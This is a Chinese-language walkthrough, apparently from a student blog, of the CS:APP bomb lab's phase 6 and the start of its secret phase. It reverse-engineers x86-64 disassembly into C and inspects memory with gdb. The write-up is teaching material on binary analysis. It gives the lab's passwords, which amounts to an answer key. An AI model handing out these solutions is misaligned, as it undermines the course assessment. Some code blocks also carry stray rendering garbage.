<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_6&gt;:</span><br><span class="line"> 4010f4:   41 56                   push   %r14</span><br><span class="line"> 4010f6:   41 55                   push   %r13</span><br><span class="line"> 4010f8:   41 54                   push   %r12</span><br><span class="line"> 4010fa:   55                      push   %rbp</span><br><span class="line"> 4010fb:   53                      push   %rbx</span><br><span class="line"> 4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line"> 401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line"> 401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line"> 401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line"> 40110b:   49 89 e6                mov    %rsp,%r14</span><br><span class="line"> 40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line"> 401114:   4c 89 ed                mov    %r13,%rbp</span><br><span class="line"> 401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line"> 40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line"> 40111e:   83 f8 05                cmp    $0x5,%eax</span><br><span class="line"> 401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line"> 401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401128:   41 83 c4 01             add    $0x1,%r12d</span><br><span class="line"> 40112c:   41 83 fc 06             cmp    $0x6,%r12d</span><br><span class="line"> 401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line"> 401132:   44 89 e3                mov    %r12d,%ebx</span><br><span class="line"> 401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line"> 401138:   8b 04 84                mov    (%rsp,%rax,4),%eax</span><br><span class="line"> 40113b:   39 45 00                cmp    %eax,0x0(%rbp)</span><br><span class="line"> 40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line"> 401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line"> 401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line"> 40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line"> 40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line"> 401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line"> 401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line"> 401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line"> 40115b:   b9 07 00 00 00          mov    $0x7,%ecx</span><br><span class="line"> 401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line"> 401162:   2b 10                   sub    (%rax),%edx</span><br><span class="line"> 401164:   89 10                   mov    %edx,(%rax)</span><br><span class="line"> 401166:   48 83 c0 04             add    $0x4,%rax</span><br><span class="line"> 40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line"> 40116f:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line"> 401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line"> 401176:   48 8b 52 08             mov    0x8(%rdx),%rdx</span><br><span class="line"> 40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line"> 40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line"> 40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"> 401183:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line"> 40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line"> 401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line"> 401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"> 401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx</span><br><span class="line"> 40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line"> 40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line"> 4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> 4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line"> 4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line"> 4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line"> 4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line"> 4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line"> 4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line"> 4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line"> 4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line"> 4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"> 4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line"> 4011d9:   00</span><br><span class="line"> 4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line"> 4011df:   48 8b 43 08             mov    0x8(%rbx),%rax</span><br><span class="line"> 4011e3:   8b 00                   mov    (%rax),%eax</span><br><span class="line"> 4011e5:   39 03                   cmp    %eax,(%rbx)</span><br><span class="line"> 4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line"> 4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line"> 4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line"> 4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line"> 4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line"> 4011fb:   5b                      pop    %rbx</span><br><span class="line"> 4011fc:   5d                      pop    %rbp</span><br><span class="line"> 4011fd:   41 5c                   pop    %r12</span><br><span class="line"> 4011ff:   41 5d                   pop    %r13</span><br><span class="line"> 401201:   41 5e                   pop    %r14</span><br><span class="line"> 401203:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>发现这段代码相当长，所以这里就不逐句分析了，直接逆向工程。</p>
<h5 id="6-2-1-第一部分（4010f4-40110b）"><a href="#6-2-1-第一部分（4010f4-40110b）" class="headerlink" title="6.2.1 第一部分（4010f4 ~ 40110b）"></a>6.2.1 第一部分（4010f4 ~ 40110b）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010f4:   41 56                   push   %r14</span><br><span class="line">4010f6:   41 55                   push   %r13</span><br><span class="line">4010f8:   41 54                   push   %r12</span><br><span class="line">4010fa:   55                      push   %rbp</span><br><span class="line">4010fb:   53                      push   %rbx</span><br><span class="line">4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line">401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">40110b:   49 89 e6                mov    %rsp,%r14</span><br></pre></td></tr></table></figure>

<p>首先读入 6 个整数（详见 2.2.2 节），保存到栈中。</p>
<blockquote>
<p>%rsi = %r13 = %r14 = %rsp<br>0x00(%rsp) = nums[0]<br>0x04(%rsp) = nums[1]<br>0x08(%rsp) = nums[2]<br>0x0c(%rsp) = nums[3]<br>0x10(%rsp) = nums[4]<br>0x14(%rsp) = nums[5]</p>
</blockquote>
<p>其中，<code>nums[0]</code> ~ <code>nums[5]</code> 表示输入的字符串中解析得到的（前）6 个整数。</p>
<h5 id="6-2-2-第二部分（40110e-401151）"><a href="#6-2-2-第二部分（40110e-401151）" class="headerlink" title="6.2.2 第二部分（40110e ~ 401151）"></a>6.2.2 第二部分（40110e ~ 401151）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line">401114:   4c 89 ed                mov    %r13,%rbp</span><br><span class="line">401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line">40111e:   83 f8 05                cmp    $0x5,%eax</span><br><span class="line">401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:   41 83 c4 01             add    $0x1,%r12d</span><br><span class="line">40112c:   41 83 fc 06             cmp    $0x6,%r12d</span><br><span class="line">401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:   44 89 e3                mov    %r12d,%ebx</span><br><span class="line">401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line">401138:   8b 04 84                mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:   39 45 00                cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line">401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line">40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line">401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cur_pos = nums;                              // cur_pos in %r13, nums in %rsp</span></span><br><span class="line">next_index = <span class="number">0</span>;                                 <span class="comment">// next_index in %r12d</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    cur_num = *cur_pos;                         <span class="comment">// cur_pos in %r13, later copied to %rbp</span></span><br><span class="line">    <span class="keyword">if</span> (--cur_num &gt; <span class="number">5</span>)                          <span class="comment">// cur_num in %eax</span></span><br><span class="line">        explode_bomb();</span><br><span class="line">    ++next_index;</span><br><span class="line">    <span class="keyword">if</span> (next_index == <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = next_index; i &lt;= <span class="number">5</span>; ++i) &#123;         <span class="comment">// i in %ebx, later copied to %rax</span></span><br><span class="line">        next_num = nums[i];                     <span class="comment">// next_num in %eax</span></span><br><span class="line">        <span class="keyword">if</span> (next_num == *cur_pos)</span><br><span class="line">            explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">    ++cur_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这段代码，可以得知输入的 6 个整数需要满足以下条件：</p>
<ol>
<li>减 1 后不能超过 <code>5</code>（无符号数），即其取值范围为 [1, 6]；</li>
<li>必须互不相同。</li>
</ol>
<p>因此，这 6 个整数是 1 ~ 6 的一个全排列。</p>
<h5 id="6-2-3-第三部分（401153-40116d）"><a href="#6-2-3-第三部分（401153-40116d）" class="headerlink" title="6.2.3 第三部分（401153 ~ 40116d）"></a>6.2.3 第三部分（401153 ~ 40116d）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line">40115b:   b9 07 00 00 00          mov    $0x7,%ecx</span><br><span class="line">401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line">401162:   2b 10                   sub    (%rax),%edx</span><br><span class="line">401164:   89 10                   mov    %edx,(%rax)</span><br><span class="line">401166:   48 83 c0 04             add    $0x4,%rax</span><br><span class="line">40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>

<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 复制1234567&#x2F;&#x2F; begin_pos &#x3D; rsp;                             &#x2F;&#x2F; begin_pos in %r14</span><br><span class="line">end_pos &#x3D; rsp + 6;                              &#x2F;&#x2F; end_pos in %rsi</span><br><span class="line">minuend &#x3D; 7;                                    &#x2F;&#x2F; minuend in %ecx</span><br><span class="line">for (i &#x3D; begin_pos; i !&#x3D; end_pos; ++i) &#123;        &#x2F;&#x2F; i in %rax</span><br><span class="line">    new_num &#x3D; minuend - *i;                     &#x2F;&#x2F; new_num in %edx</span><br><span class="line">    *i      &#x3D; new_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，保存在栈中的这 6 个整数 <code>nums[i]</code> 被依次修改成了 <code>7 - nums[i]</code>。</p>
<h5 id="6-2-4-第四部分（40116f-4011a9）"><a href="#6-2-4-第四部分（40116f-4011a9）" class="headerlink" title="6.2.4 第四部分（40116f ~ 4011a9）"></a>6.2.4 第四部分（40116f ~ 4011a9）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40116f:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line"> 401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line"> 401176:   48 8b 52 08             mov    0x8(%rdx),%rdx</span><br><span class="line"> 40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line"> 40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line"> 40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"> 401183:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line"> 40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line"> 401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line"> 401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"> 401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx</span><br><span class="line"> 40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line"> 40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line"> 4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>这是本关的主体部分。试译成 C 语言代码（经整理及大量不影响原意的改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; ++i) &#123;          <span class="comment">// i in %rsi</span></span><br><span class="line">    cur_num = nums[i];              <span class="comment">// cur_num in %ecx, nums in %rsp</span></span><br><span class="line">    p_node  = <span class="number">0x6032d0</span>;             <span class="comment">// p_node in %edx</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; cur_num; ++j)   <span class="comment">// j in %eax</span></span><br><span class="line">        p_node = *(++p_node);       <span class="comment">// assure that p_node is always a pointer</span></span><br><span class="line">    ptrs[i] = p_node;               <span class="comment">// ptrs in %rsp + 0x20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，根据被修改后的这 6 个整数 <code>nums[i]</code>，这段代码在 <code>ptrs[i]</code>（即 <code>*(%rsp + 0x20 + i * 0x8)</code>）中存放经过 <code>nums[i] - 1</code> 次 <code>p_node = *(++p_node);</code> 操作的地址 <code>p_node</code>，其中 <code>p_node</code> 的初始值为 <code>0x6032d0</code>。</p>
<p>可以看出这实际就是将链表的 6 个结点以 <code>nums[i]</code> 为索引顺序存到栈中。每次操作就是将 <code>p_node</code> 指向下一个结点，因此经过 <code>nums[i] - 1</code> 次操作得到的 <code>p_node</code> 就是 <code>nums[i]</code> 号结点的地址 <code>p_node(nums[i])</code>。</p>
<blockquote>
<p>ptrs[i] = p_node(nums[i])</p>
</blockquote>
<p>由之前的分析，<code>nums[i]</code> 是 1 ~ 6 的一个全排列，由此可以得到这 6 个结点的地址。</p>
<p>以进行 1 次操作为例，使用 gdb 查看此时 <code>p_node</code> 的值（原 <code>p_node</code> + <code>0x8</code> 所指向的内容）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) x&#x2F;xw 0x6032d8</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">0x6032d8 &lt;node1+8&gt;:     0x006032e0</span><br></pre></td></tr></table></figure>

<p>这就是 2 号结点的地址 <code>p_node2</code>。</p>
<p>用同样的方式得到 6 个结点的地址：</p>
<blockquote>
<p>p_node1 = 0x6032d0<br>p_node2 = 0x6032e0<br>p_node3 = 0x6032f0<br>p_node4 = 0x603300<br>p_node5 = 0x603310<br>p_node6 = 0x603220</p>
</blockquote>
<h5 id="6-2-5-第五部分（4011ab-4011d0）"><a href="#6-2-5-第五部分（4011ab-4011d0）" class="headerlink" title="6.2.5 第五部分（4011ab ~ 4011d0）"></a>6.2.5 第五部分（4011ab ~ 4011d0）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> 4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line"> 4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line"> 4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line"> 4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line"> 4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line"> 4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line"> 4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line"> 4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line"> 4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"> 4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line"> 4011d9:   00</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">123456789b</span>egin_node = *ptrs;                 <span class="comment">// begin_node in %rbx, ptrs in %rsp + 0x20</span></span><br><span class="line">next_pos   = ptrs + <span class="number">1</span>;              <span class="comment">// next_pos in %rax</span></span><br><span class="line">end_pos    = ptrs + <span class="number">6</span>;              <span class="comment">// end_pos in %rsi</span></span><br><span class="line"><span class="keyword">for</span> (cur_node = begin_node; next_pos != end_pos;</span><br><span class="line">     cur_node = next_node) &#123;        <span class="comment">// cur_node in %rcx</span></span><br><span class="line">    next_node       = *next_pos;    <span class="comment">// next_node in %rdx</span></span><br><span class="line">    *(cur_node + <span class="number">1</span>) = next_node;</span><br><span class="line">    ++next_pos;</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<p>可见，这段代码的作用为按<strong>在栈中地址由低到高顺序</strong>遍历链表的 6 个结点，将它们串联起来。</p>
<p>这里的 <code>*(cur_node + 1)</code> 实质上就是 <code>cur_node-&gt;next</code>（即 <code>(*cur_node).next</code>），因为链表中的结点其实是一个结构体（struct），结点所在的地址指向的是数据 <code>val</code>，加上 <code>0x8</code> 后指向的也就是指针 <code>next</code>。此处将该指针 <code>next</code> 指向了下一个结点。</p>
<h5 id="6-2-6-第六部分（4011da-401203）"><a href="#6-2-6-第六部分（4011da-401203）" class="headerlink" title="6.2.6 第六部分（4011da ~ 401203）"></a>6.2.6 第六部分（4011da ~ 401203）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line">4011df:   48 8b 43 08             mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:   8b 00                   mov    (%rax),%eax</span><br><span class="line">4011e5:   39 03                   cmp    %eax,(%rbx)</span><br><span class="line">4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line">4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line">4011fb:   5b                      pop    %rbx</span><br><span class="line">4011fc:   5d                      pop    %rbp</span><br><span class="line">4011fd:   41 5c                   pop    %r12</span><br><span class="line">4011ff:   41 5d                   pop    %r13</span><br><span class="line">401201:   41 5e                   pop    %r14</span><br><span class="line">401203:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="number">12345678f</span><span class="keyword">or</span> (i = <span class="number">5</span>; i != <span class="number">0</span>; --i) &#123;          <span class="comment">// i in %ebp</span></span><br><span class="line">    next_node = *(cur_node + <span class="number">1</span>);    <span class="comment">// next_node in %rax, cur_node in %rbx</span></span><br><span class="line">    next_num  = *next_node;         <span class="comment">// next_num in %eax</span></span><br><span class="line">    <span class="keyword">if</span> (*cur_node &lt; next_num)</span><br><span class="line">        explode_bomb();</span><br><span class="line">    cur_node = *(cur_node + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next_node;</span><br></pre></td></tr></table></figure>

<p>由上一节的分析，<code>*cur_node</code> 即 <code>cur_node-&gt;val</code>，<code>*(cur_node + 1)</code> 即 <code>cur_node-&gt;next</code>。通过这段代码，可以发现链表各个结点的数据 <code>val</code> 需要是顺序递减的。</p>
<p>以 1 号结点 <code>node1</code> 为例，使用 gdb 查看其数据 <code>val</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) x&#x2F;d 0x6032d0</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">1</span><br><span class="line">0x6032d0 &lt;node1&gt;:       332</span><br></pre></td></tr></table></figure>

<p>用同样的方式得到链表 6 个结点的数据：</p>
<blockquote>
<p>p_node1-&gt;val = 332<br>p_node2-&gt;val = 168<br>p_node3-&gt;val = 924<br>p_node4-&gt;val = 691<br>p_node5-&gt;val = 477<br>p_node6-&gt;val = 443</p>
</blockquote>
<p>按递减顺序排列后，可见在栈中地址由低到高应当分别为 <code>3</code>, <code>4</code>, <code>5</code>, <code>6</code>, <code>1</code>, <code>2</code> 号结点。</p>
<h5 id="6-2-7-确定输入的-6-个整数"><a href="#6-2-7-确定输入的-6-个整数" class="headerlink" title="6.2.7 确定输入的 6 个整数"></a>6.2.7 确定输入的 6 个整数</h5><p>由之前的分析，<code>nums[i]</code> 在第三部分的代码中被依次修改成了 <code>7 - nums[i]</code>，而修改后的值分别对应栈中结点的标号 <code>3</code>, <code>4</code>, <code>5</code>, <code>6</code>, <code>1</code>, <code>2</code>。</p>
<p>因此，最开始输入的 6 个整数也就是 <code>4</code>, <code>3</code>, <code>2</code>, <code>1</code>, <code>6</code>, <code>5</code>，本关密码即为 <code>4 3 2 1 6 5</code>。</p>
<h5 id="6-2-8-测试"><a href="#6-2-8-测试" class="headerlink" title="6.2.8 测试"></a>6.2.8 测试</h5><p>在 gdb 中输入 Phase 6 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>

<h3 id="7-结束了吗"><a href="#7-结束了吗" class="headerlink" title="7. 结束了吗"></a>7. 结束了吗</h3><p>在 bomb.c 文件的最后，留下了这样一句耐人寻味的话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* Wow, they got it!  But isn&#39;t something... missing?  Perhaps</span><br><span class="line"> * something they overlooked?  Mua ha ha ha ha! *&#x2F;</span><br></pre></td></tr></table></figure>

<p>这是因为，本 Lab 还有一个隐藏关！</p>
<h3 id="8-Secret-phase"><a href="#8-Secret-phase" class="headerlink" title="8. Secret phase"></a>8. Secret phase</h3><h4 id="8-1-本关密码"><a href="#8-1-本关密码" class="headerlink" title="8.1 本关密码"></a>8.1 本关密码</h4><h5 id="8-1-1-开启隐藏关的方法"><a href="#8-1-1-开启隐藏关的方法" class="headerlink" title="8.1.1 开启隐藏关的方法"></a>8.1.1 开启隐藏关的方法</h5><p>在 Phase 4 输入的 2 个整数后再额外输入 1 个字符串 <code>DrEvil</code>，比如将输入的字符串修改为 <code>7 0 DrEvil</code>，其余环节不变。</p>
<h5 id="8-1-2-隐藏关的密码"><a href="#8-1-2-隐藏关的密码" class="headerlink" title="8.1.2 隐藏关的密码"></a>8.1.2 隐藏关的密码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22, 20</span><br></pre></td></tr></table></figure>

<h4 id="8-2-解题过程"><a href="#8-2-解题过程" class="headerlink" title="8.2 解题过程"></a>8.2 解题过程</h4><h5 id="8-2-0-找到隐藏函数"><a href="#8-2-0-找到隐藏函数" class="headerlink" title="8.2.0 找到隐藏函数"></a>8.2.0 找到隐藏函数</h5><p>好吧，实际上在 bomb.asm 中稍微往下翻翻就能找到一个名为 <code>secret_phase</code> 的函数。顾名思义，这应该就是隐藏关所对应的函数。</p>
<h5 id="8-2-1-找到开启隐藏关的方法"><a href="#8-2-1-找到开启隐藏关的方法" class="headerlink" title="8.2.1 找到开启隐藏关的方法"></a>8.2.1 找到开启隐藏关的方法</h5><p>事实上，前 6 关通过后，程序就自动终止了。那么应该如何进入这个隐藏关呢？</p>
<p>在 bomb.asm 搜索关键词 <code>secret_phase</code>，可以发现在函数 <code>phase_defused</code> 中出现了调用函数 <code>secret_phase</code> 的语句 401630: <code>callq 401242</code>。其中函数 <code>phase_defused</code> 就是每关通过后都会调用的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:   48 83 ec 78             sub    $0x78,%rsp</span><br><span class="line">  4015c8:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:   00 00</span><br><span class="line">  4015d1:   48 89 44 24 68          mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:   be 19 26 40 00          mov    $0x402619,%esi</span><br><span class="line">  4015f5:   bf 70 38 60 00          mov    $0x603870,%edi</span><br><span class="line">  4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:   83 f8 03                cmp    $0x3,%eax</span><br><span class="line">  401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:   be 22 26 40 00          mov    $0x402622,%esi</span><br><span class="line">  401609:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:   85 c0                   test   %eax,%eax</span><br><span class="line">  401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  